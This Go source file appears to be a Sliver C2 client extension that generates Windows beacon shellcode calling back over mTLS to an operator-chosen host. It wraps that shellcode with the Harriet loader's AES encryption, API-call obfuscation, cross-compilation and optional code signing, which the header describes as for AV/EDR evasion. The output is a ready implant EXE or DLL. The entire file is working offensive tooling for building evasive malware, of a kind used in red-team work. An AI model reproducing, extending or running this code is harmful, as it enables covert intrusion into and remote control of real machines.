package harriet

/*
	Sliver Implant Framework - Harriet Stager Integration
	Copyright (C) 2024  Bishop Fox / mgstate

	Generates Sliver shellcode and wraps it with Harriet's AES-encrypted
	C++ loader for AV/EDR evasion. Produces a signed EXE or DLL.

	Uses Harriet's native EXE.sh/DLL.sh build scripts which handle:
	  - AES encryption of shellcode
	  - Template substitution with random variable names
	  - XOR obfuscation of API calls
	  - MinGW cross-compilation
	  - Optional code signing

	Requires: Harriet repo at configurable path, mingw cross-compiler,
	Python3 with pycryptodome, osslsigncode for signing.
*/

import (
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/spf13/cobra"
)

const (
	defaultHarrietPath = "/opt/Home-Grown-Red-Team/Harriet"
)

// methodToMenuNum maps our method flag values to Harriet's interactive menu numbers.
// Harriet EXE.sh/DLL.sh menu:
//
//	1) FULLAes
//	2) FULLInj
//	3) QueueUserAPC
//	4) NativeAPI
//	5) DirectSyscalls
var methodToMenuNum = map[string]string{
	"aes":            "1",
	"inject":         "2",
	"queueapc":       "3",
	"nativeapi":      "4",
	"directsyscall":  "5",
	"directsyscalls": "5",
}

// HarrietGenerateCmd - Generate a Harriet-wrapped Sliver payload
func HarrietGenerateCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	outputName, _ := cmd.Flags().GetString("output")
	harrietPath, _ := cmd.Flags().GetString("harriet-path")
	format, _ := cmd.Flags().GetString("format")
	method, _ := cmd.Flags().GetString("method")
	listener, _ := cmd.Flags().GetString("listener")
	arch, _ := cmd.Flags().GetString("arch")
	shellcodeFile, _ := cmd.Flags().GetString("shellcode")

	if harrietPath == "" {
		harrietPath = defaultHarrietPath
	}

	// Validate Harriet installation
	if _, err := os.Stat(harrietPath); os.IsNotExist(err) {
		con.PrintErrorf("Harriet not found at %s\n", harrietPath)
		con.PrintInfof("Clone it: git clone https://github.com/assume-breach/Home-Grown-Red-Team.git\n")
		con.PrintInfof("Then: harriet --harriet-path /path/to/Harriet\n")
		return
	}

	var shellcodePath string
	var cleanupShellcode bool

	if shellcodeFile != "" {
		// Use pre-generated shellcode file
		if _, err := os.Stat(shellcodeFile); os.IsNotExist(err) {
			con.PrintErrorf("Shellcode file not found: %s\n", shellcodeFile)
			return
		}
		shellcodePath = shellcodeFile
		con.PrintInfof("Using shellcode file: %s\n", shellcodeFile)
	} else {
		// Generate Sliver shellcode via RPC
		con.PrintInfof("Generating Sliver shellcode...\n")
		var err error
		shellcodePath, err = generateSliverShellcode(con, listener, arch, format)
		if err != nil {
			con.PrintErrorf("Failed to generate shellcode: %s\n", err)
			con.PrintInfof("Tip: generate manually with 'generate --format shellcode' then use --shellcode <file>\n")
			return
		}
		cleanupShellcode = true
	}
	if cleanupShellcode {
		defer os.Remove(shellcodePath)
	}

	con.PrintInfof("Shellcode: %s\n", shellcodePath)

	// Build with Harriet's native scripts
	con.PrintInfof("Building Harriet payload (method: %s, format: %s)...\n", method, format)

	outputPath, err := buildHarrietPayload(con, harrietPath, shellcodePath, outputName, method, format)
	if err != nil {
		con.PrintErrorf("Harriet build failed: %s\n", err)
		return
	}

	// Get file size
	if info, err := os.Stat(outputPath); err == nil {
		con.PrintInfof("Harriet payload ready: %s (%d bytes)\n", outputPath, info.Size())
	} else {
		con.PrintInfof("Harriet payload ready: %s\n", outputPath)
	}
	con.PrintInfof("Method: %s | Format: %s\n", method, format)
}

// generateSliverShellcode - Use Sliver's Generate API to create shellcode
func generateSliverShellcode(con *console.SliverClient, listener string, arch string, format string) (string, error) {
	// Create temp file for shellcode
	tmpFile, err := os.CreateTemp("", "sliver-sc-*.bin")
	if err != nil {
		return "", fmt.Errorf("failed to create temp file: %s", err)
	}
	tmpFile.Close()

	goarch := "amd64"
	if arch == "x86" || arch == "386" {
		goarch = "386"
	}

	// Parse listener (host:port) for C2 config
	c2Host := ""
	c2Port := ""
	if listener != "" {
		parts := strings.SplitN(listener, ":", 2)
		c2Host = parts[0]
		if len(parts) == 2 {
			c2Port = parts[1]
		}
	}
	if c2Host == "" {
		return "", fmt.Errorf("--listener host:port is required for shellcode generation (e.g. --listener 10.0.0.1:8888)")
	}

	c2URL := fmt.Sprintf("mtls://%s:%s", c2Host, c2Port)

	config := &clientpb.ImplantConfig{
		GOOS:        "windows",
		GOARCH:      goarch,
		Format:      clientpb.OutputFormat_SHELLCODE,
		IsShellcode: true,
		IsBeacon:    true,
		C2: []*clientpb.ImplantC2{
			{URL: c2URL, Priority: 0},
		},
		BeaconInterval: 60,
		BeaconJitter:   30,
	}

	generate, err := con.Rpc.Generate(context.Background(), &clientpb.GenerateReq{
		Config: config,
	})
	if err != nil {
		return "", fmt.Errorf("generate failed: %s\nTip: use --shellcode <file> with pre-generated shellcode instead", err)
	}

	shellcode := generate.GetFile().GetData()
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode generated")
	}

	if err := os.WriteFile(tmpFile.Name(), shellcode, 0600); err != nil {
		return "", fmt.Errorf("failed to write shellcode: %s", err)
	}

	con.PrintInfof("Generated %d byte shellcode (beacon via %s)\n", len(shellcode), c2URL)
	return tmpFile.Name(), nil
}

// buildHarrietPayload - Run Harriet's native EXE.sh or DLL.sh build script.
//
// The scripts are interactive and prompt for:
//  1. Method selection (menu number 1-5)
//  2. Shellcode file path
//  3. Output filename
//
// We pipe these values via stdin.
func buildHarrietPayload(con *console.SliverClient, harrietPath string, shellcodePath string, output string, method string, format string) (string, error) {
	// Find the build script
	scriptName := "EXE.sh"
	if format == "dll" {
		scriptName = "DLL.sh"
	}

	// Try multiple locations (handles double-nested Harriet/Harriet/ structure)
	scriptPath := ""
	candidates := []string{
		filepath.Join(harrietPath, scriptName),
		filepath.Join(harrietPath, "Harriet", scriptName),
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			scriptPath = c
			break
		}
	}
	if scriptPath == "" {
		return "", fmt.Errorf("Harriet script %s not found. Checked:\n  %s", scriptName, strings.Join(candidates, "\n  "))
	}

	// Map method to menu number
	menuNum, ok := methodToMenuNum[strings.ToLower(method)]
	if !ok {
		con.PrintWarnf("Unknown method %q, defaulting to FULLAes (1)\n", method)
		menuNum = "1"
	}

	// Determine output path
	outputFile := output
	if outputFile == "" {
		if format == "dll" {
			outputFile = "payload.dll"
		} else {
			outputFile = "payload.exe"
		}
	}
	outputPath, _ := filepath.Abs(outputFile)

	// Get the absolute shellcode path (Harriet scripts may cd around)
	absShellcode, _ := filepath.Abs(shellcodePath)

	con.PrintInfof("Script: %s\n", scriptPath)
	con.PrintInfof("Method: %s (menu option %s)\n", method, menuNum)

	// Run the Harriet script with piped stdin
	// EXE.sh/DLL.sh expects interactive input:
	//   Line 1: method number (1-5)
	//   Line 2: shellcode file path
	//   Line 3: output filename (just the name, not full path)
	scriptDir := filepath.Dir(scriptPath)
	cmdExe := exec.Command("bash", scriptPath)
	cmdExe.Dir = scriptDir

	// Pipe the interactive inputs
	stdin, err := cmdExe.StdinPipe()
	if err != nil {
		return "", fmt.Errorf("failed to create stdin pipe: %s", err)
	}

	// Capture stdout+stderr
	var outBuf strings.Builder
	cmdExe.Stdout = io.Writer(&outBuf)
	cmdExe.Stderr = io.Writer(&outBuf)

	if err := cmdExe.Start(); err != nil {
		return "", fmt.Errorf("failed to start %s: %s", scriptName, err)
	}

	// Send interactive inputs
	fmt.Fprintf(stdin, "%s\n", menuNum)
	fmt.Fprintf(stdin, "%s\n", absShellcode)
	fmt.Fprintf(stdin, "%s\n", outputPath)
	stdin.Close()

	if err := cmdExe.Wait(); err != nil {
		return "", fmt.Errorf("%s failed: %s\nOutput:\n%s", scriptName, err, outBuf.String())
	}

	con.PrintInfof("Harriet build output:\n%s\n", outBuf.String())

	// Check if output was created — Harriet may place it in its own directory
	if _, err := os.Stat(outputPath); err == nil {
		return outputPath, nil
	}

	// Harriet sometimes outputs to its script directory with just the filename
	outputBase := filepath.Base(outputFile)
	altPath := filepath.Join(scriptDir, outputBase)
	if _, err := os.Stat(altPath); err == nil {
		// Move to requested output location
		if mvErr := os.Rename(altPath, outputPath); mvErr != nil {
			// If rename fails (cross-device), copy instead
			data, rdErr := os.ReadFile(altPath)
			if rdErr != nil {
				return altPath, nil // Return where it actually is
			}
			if wrErr := os.WriteFile(outputPath, data, 0755); wrErr != nil {
				return altPath, nil
			}
			os.Remove(altPath)
		}
		return outputPath, nil
	}

	// Search for any recently created exe/dll in the script directory
	pattern := "*.exe"
	if format == "dll" {
		pattern = "*.dll"
	}
	matches, _ := filepath.Glob(filepath.Join(scriptDir, pattern))
	if len(matches) > 0 {
		// Use the most recent match
		bestMatch := matches[len(matches)-1]
		con.PrintWarnf("Output not at expected path, found: %s\n", bestMatch)
		if mvErr := os.Rename(bestMatch, outputPath); mvErr != nil {
			return bestMatch, nil
		}
		return outputPath, nil
	}

	return "", fmt.Errorf("build appeared to succeed but output file not found at %s\nScript output:\n%s", outputPath, outBuf.String())
}
